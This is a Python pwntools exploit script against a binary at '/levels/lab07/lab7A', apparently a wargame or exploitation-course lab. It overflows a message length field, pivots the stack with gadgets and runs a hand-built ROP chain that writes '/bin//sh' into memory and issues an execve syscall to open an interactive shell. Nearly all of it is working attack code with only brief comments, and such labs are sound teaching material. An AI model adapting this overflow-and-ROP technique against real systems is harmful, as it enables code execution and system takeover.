from pwn import *

p = process(["/levels/lab07/lab7A"])
log.info(util.proc.pidof(p))
pause()

# ROP gadgets
add_esp_0x2C_ret = 0x08048fcd # Actually : add esp, 0x24 ; pop ebx ; pop ebp ; ret
mov_eax_edx_ret = 0x080671c4 # mov eax, edx ; ret
xchg_eax_esp_ret = 0x0804bb6c # xchg eax, esp ; ret

# Create a message with a length that'll overflow into its own length field
log.info("Creating first message")
p.recvuntil("Enter Choice:")
p.sendline("1")
p.sendline("131")
p.sendline("x"*131)
# Create a second message we can overflow into
log.info("Creating second message")
p.recvuntil("Enter Choice:")
p.sendline("1")
p.sendline("100") # doesn't matter
p.sendline("dontmatter")
## Edit the first message, with the now-trashed length and overflow into the second
log.info("Editing first message")
p.recvuntil("Enter Choice:")
p.sendline("2")
p.sendline("0") # index
# The ROP once we pivot
ROP = ""
# Write /bin
ROP += p32(0x0807030a) # pop edx ; ret
ROP += p32(0x080ed000) # @ .data
ROP += p32(0x080bd226) # pop eax ; ret
ROP += '/bin'
ROP += p32(0x080a3a1d) # mov dword ptr [edx], eax ; ret
# Write //sh
ROP += p32(0x0807030a) # pop edx ; ret
ROP += p32(0x080ed004) # @ .data + 4
ROP += p32(0x080bd226) # pop eax ; ret
ROP += '//sh'
ROP += p32(0x080a3a1d) # mov dword ptr [edx], eax ; ret
# Close off with nulls
ROP += p32(0x0807030a) # pop edx ; ret
ROP += p32(0x080ed008) # @ .data + 8
ROP += p32(0x08055b40) # xor eax, eax ; ret
ROP += p32(0x080a3a1d) # mov dword ptr [edx], eax ; ret
# ebx points to "/bin//sh"
ROP += p32(0x080481c9) # pop ebx ; ret
ROP += p32(0x080ed000) # @ .data
# ecx points to null
ROP += p32(0x080e76ad) # pop ecx ; ret
ROP += p32(0x080ed008) # @ .data + 8
# edx points to null
ROP += p32(0x0807030a) # pop edx ; ret
ROP += p32(0x080ed008) # @ .data + 8
# inc eax until it's 0xb
ROP += p32(0x08055b40) # xor eax, eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
ROP += p32(0x0807cd76) # inc eax ; ret
# syscall
ROP += p32(0x08048ef6) # int 0x80

# This is both the first and the third ROP.
p.sendline("x"*(0xae8-0x9d8-132) + p32(add_esp_0x2C_ret) + "B"*0x2C + ROP) # Moves the stack into numbuf
## 'Print' the second message, starting the ROP
log.info("Printing second message")
p.recvuntil("Enter Choice:")
p.sendline("4")
# This will mov edx into esp, which points to message[1], which is the first ROP again.
p.sendline("1xxx" + "a"*(0xc-4) + p32(mov_eax_edx_ret) + p32(xchg_eax_esp_ret)) # Pivot
#
p.interactive()

